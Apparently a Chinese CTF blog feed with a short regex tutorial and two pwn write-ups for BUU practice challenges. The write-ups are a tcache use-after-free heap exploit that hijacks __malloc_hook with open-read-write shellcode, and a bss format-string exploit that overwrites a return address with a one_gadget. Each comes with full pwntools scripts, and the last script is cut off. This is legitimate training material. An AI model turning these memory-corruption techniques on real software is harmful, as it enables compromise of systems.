    
    <entry>
      <title>正则表达式的使用</title>
      <link href="/2021/11/19/Re/"/>
      <url>/2021/11/19/Re/</url>
      
        <content type="html"><![CDATA[<p>最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。</p><span id="more"></span><p>那么我已开始接触正则呢，应该是在学爬虫的时候，因为当时爬虫学的不太好也就没有接着学正则匹配。后来在换了linux系统之后经常会用到一个很有用的东西，那就是|grep。不得不说这个在找东西的时候真的是很有用的，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ls -l | grep &quot;&quot;</span><br></pre></td></tr></table></figure><p>那么本次和Nepnep战队参加xctf分区赛也是有一道修复二维码的题目，当时师傅们可能有些点没注意到，导致最后修复的二维码多达16000的扫描结果。</p><p><img src="/2021/11/19/Re/1.png" alt="1"></p><p>得到结果之后本以为要经历漫长的人工过滤，可是咱们战队的一位爷爷直接solved，而这位爷爷就是直接用了正则匹配。</p><p><img src="/2021/11/19/Re/2.png" alt="2"></p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。</p><p>以上来自维基百科。</p><h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><p>右斜杠(\)老转义符了，在右斜杠之后的一个字将会带有特殊含义，如果要匹配右斜杠则需要双写。</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>通配符我们熟知的就是星号(*)和问号(?)，一般情况下它们分别代表任意多个字符或者是任意一个字符，在正则表达式中存在三种类似的符号，并且不能匹配任意字符，只能代表前面一个字符的数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+：匹配一个或多个字符</span><br><span class="line">?：匹配一个或零个字符</span><br><span class="line">*：匹配零个或多个字符</span><br></pre></td></tr></table></figure><p>例如</p><p>‘a+’可以匹配’a’,’aa’,’aaa’,’aaaa’……等字符串。</p><p>‘a?’可以匹配’a’或者空串</p><p>‘a*’则可以匹配第一种情况和第二种情况的并集。</p><h3 id="匹配任意字符"><a href="#匹配任意字符" class="headerlink" title="匹配任意字符"></a>匹配任意字符</h3><p>[]方括号用于匹配单个字符。</p><p>例如</p><p>[abcde]可以匹配a,b,c,d,e中的任意一个字符。</p><p>如果加上^则代表匹配除了列表以外的所有字符。</p><p>例如</p><p>[^a]表示匹配所有非’a’的字符。</p><h3 id="匹配次数限定"><a href="#匹配次数限定" class="headerlink" title="匹配次数限定"></a>匹配次数限定</h3><p>{}用于限定匹配次数</p><p>例如：</p><p>[ab]{3}表示[ab]匹配三次，[ab]{3,}表示至少匹配三次。</p><p>就先学这么多吧，后续再学就再加。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap writeup</title>
      <link href="/2021/11/10/SWPUCTF_2019_p1KkHeap/"/>
      <url>/2021/11/10/SWPUCTF_2019_p1KkHeap/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#SWPUCTF_2019_p1KkHeap">SWPUCTF_2019_p1KkHeap</a></p><span id="more"></span><p>这波又刷新了我对2.27版本libc的认知。那就是tcache struct ，话不多说看题。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>64位保护全开，习惯就好。载入IDA查看发现plt表有很多函数，其中有<code>mmap</code>和<code>prctl</code>，<code>prctl</code>最常见的就是设置沙箱规则，<code>mmap</code>最常见的就是直接给一个可读可写可执行的一片内存区域，那么我们返回终端查看一下沙箱规则。</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/1.png" alt="1"></p><p>这个有点复杂，不过大概率就可以认为他给你禁用了<code>execve</code>，其它的基本不用管，大概意思就是<code>write</code>函数的<code>count</code>必须非负，且大小在32位int范围内，并且不能=0x10，有一说一这个0x10并不理解为啥限制这个不能等于0x10，因为我读<code>flag</code>一般是读0x40</p><p>我们看看初始化函数，可以看到<code>mmap</code>分配了一片很大的内存并且是可读可写可执行的权限，那么开了沙箱之后我们就能往里面写<code>orw</code>的<code>shellcode</code>，然后再劫持某些东西让它跳转到这个区域。</p><p>分析逻辑， 经典堆菜单题目，包含了增删改查，但是有一个全局变量一直在++并且循环并非while 1，可以发现这个初始值为0x12，意味着我们只能操作18次。先看删除，发现删除没有把指针清零，存在<code>UAF</code>，但是会把另一个东西清零，并且跟外面一样，删除有次数限制，只有三次机会。添加堆块会现寻找第一个指针不为0的指针，然后分配，最多同时存在八个堆块，size被限定在0x100以内。<code>show</code>会直接打印堆块上面的信息，<code>edit</code>就是根据输入的<code>size</code>读入数据，删除会导致无法edit，但是不影响show，所以这个地方可以用于泄露，后面的利用也都以uaf为基础攻击。</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>这里需要注意，glibc在2.26版本加入了tcache，tcache在堆上管理，会分配一个0x250大小的堆块，这就是一个tcache struct 上面会存储每个size tcache 的个数和tcache第一个堆块的地址。首先double free然后show 泄露heap的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>泄露了之后我们接下来需要申请堆块到tcache struct上面来进行一些操作方便我们修改某些东西。我们都知道，每个大小的tcache bin最多存在7个，超过则会对应进入fastbin 或者 unsorted bin。那么我们把size改成7然后再free 再show就可以泄露libc的地址了。我们还可以顺便把第一个tcache的地址改成那个分配的可读可写可执行的区域，等会直接申请就可以在上面写数据了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>最后比较简单，就是写shellcode orw然后劫持malloc hook而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br></pre></td></tr></table></figure><p>来看看结果吧</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/2.png" alt="2"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29949</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./SWPUCTF_2019_p1KkHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;=&#x27;)</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>npuctf_2020_level2 writeup</title>
      <link href="/2021/11/10/npuctf_2020_level2/"/>
      <url>/2021/11/10/npuctf_2020_level2/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#npuctf_2020_level2">npuctf_2020_level2</a></p><span id="more"></span><p>这题刷新了我对格式化字符串的利用，来康康吧。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>十分简单，就是主函数while循环输入然后格式化字符串漏洞，但是不同的是这个格式化字符串并不在stack段而是在bss段上的。那就考虑考虑字符串在bss段和在stack段的区别，我们平时做的都是在stack段的，因为buf输入一般都是在printf调用之前，所以printf的栈帧会比buf低，而参数在高地址，那么此时printf的参数我们就可控，在buf上写上一个地址然后算出偏移用%n格式串去写就能基本达到任意title写的目的。但是如果它在bss段上或者是在堆上，那么格式化字符串的参数控制不了我们就得另寻方法了。其实也还好，第一步我们可以先控制一个栈的参数，栈里面都会有存函数的ebp，那么可以通过这个来写一个目的地址，再通过目的地址任意写我们想写的内容。讲简单一点其实也就是控制一个栈的地址然后写上目的地址，最后再往目的地址写东西，有格式化字符串漏洞那么基本stack，code和libc地址跟送的一样随便泄露。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>先gdb起这个程序，然后运行到printf这边观察栈情况。</p><p><img src="/2021/11/10/npuctf_2020_level2/1.png" alt="1"></p><p>可以观察到libc的应该是第7个参数，第9个参数有一个栈地址，第六个参数和第11个参数有一个程序加载地址可以泄露。这里的参数个数指的是排除格式化字符串参数后的计数，比如printf(“%d”,1);这里我就直接把1当成第一个参数了。</p><p>所以开局三个地址都出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br></pre></td></tr></table></figure><p>然后可以看到那个libc得到的值实际上是返回地址，因为main的父函数就是libc_start_main函数嘛。所以我们应该要写这里，怎么写呢？通过栈地址，我们可以通过修改第9个参数的低两个字节到返回地址，然后再%n覆盖，因为不能一次写太多，所以每一次修改最多两个字节，然后马上把这个地址向后移两位然后再写两个字节，至于写什么，那自然是one_gadget最简便了，并且第一个就符合条件了。但是实际操作的时候我傻了，我是通过这个地址写到另一个地址的低两位字节改成了返回地址再通过那个写的，现在想来是在多此一举，但是这样的好处就是可以实现真正的任意写，假如这个题目变成noreturn，那么就只能靠劫持一些hook或者got表来实现指令跳转了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">2.23 64 libc的one_gadget条件分别是rax,[rsp+0x30,+0x50,+0x70]==NULL</span></span><br><span class="line"><span class="string">2.27 64 libc的one_gadget条件分别是rsp&amp;0xf==0&amp;&amp;rcx==0 || [rsp+0x40，+0x70]==NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_2_23_32=[<span class="number">0x3ac6c</span>,<span class="number">0x3ac6e</span>,<span class="number">0x3ac72</span>,<span class="number">0x3ac79</span>,<span class="number">0x5fbd5</span>,<span class="number">0x5fbd6</span>]</span><br><span class="line">one_2_23_64=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_2_23_buu32=[<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">one_2_23_buu64=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_2_27_32=[<span class="number">0x3d123</span>,<span class="number">0x3d125</span>,<span class="number">0x3d129</span>,<span class="number">0x3d130</span>,<span class="number">0x67b4f</span>,<span class="number">0x67b50</span>,<span class="number">0x1380be</span>,<span class="number">0x1380bf</span>]</span><br><span class="line">one_2_27_64=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one_2_27_buu32=[<span class="number">0x3cbea</span>,<span class="number">0x3cbec</span>,<span class="number">0x3cbf0</span>,<span class="number">0x3cbf7</span>,<span class="number">0x6729f</span>,<span class="number">0x672a0</span>,<span class="number">0x13573e</span>,<span class="number">0x13573f</span>]</span><br><span class="line">one_2_27_buu64=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span>,ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> one</span><br><span class="line">    bit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> context.arch==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    one=<span class="built_in">eval</span>(<span class="string">&#x27;one_&#x27;</span>+libc_version.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)+<span class="string">&#x27;_&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit))</span><br><span class="line">    libc=<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        context.log_level=<span class="number">20</span></span><br><span class="line">        p=remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),ELF(libc),p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,length,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./npuctf_2020_level2&#x27;</span>,port=<span class="number">26764</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span 